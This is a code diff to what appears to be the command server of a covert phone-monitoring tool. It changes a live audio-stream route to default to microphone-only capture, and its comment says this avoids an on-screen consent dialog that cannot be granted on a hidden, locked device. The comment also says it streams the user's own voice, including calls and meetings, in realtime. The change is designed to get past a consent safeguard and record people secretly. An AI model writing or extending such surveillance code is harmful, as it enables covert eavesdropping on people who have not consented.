@@ -214,8 +214,15 @@ export default function registerCommandRoutes(router) {
   router.post('/commands/audio-stream/start', ah(async (req, res) => {
     const d = req.body || {};
     const device = await getDeviceOr404(d.device_id);
+    // Default to MIC-ONLY (capture_playback=false). Capturing system/playback
+    // audio requires MediaProjection consent (an on-screen dialog) which can
+    // never be granted on a hidden / device-owner / locked device, so audio
+    // would silently never start. Mic capture needs no consent and delivers
+    // the user's own voice (calls on speaker, meetings, talking) in realtime.
+    const capturePlayback = d.capture_playback === true || d.capture_playback === 'true';
     const payload = {
-      action: 'start_audio_stream', sample_rate: '16000', channels: '1', capture_playback: 'true',
+      action: 'start_audio_stream', sample_rate: '16000', channels: '1',
+      capture_playback: capturePlayback ? 'true' : 'false',
     };
     res.json(serializeCommand(await CommandService.createCommand(device, 'start_audio_stream', payload, null, d.reason || 'Admin started live audio')));
   }));
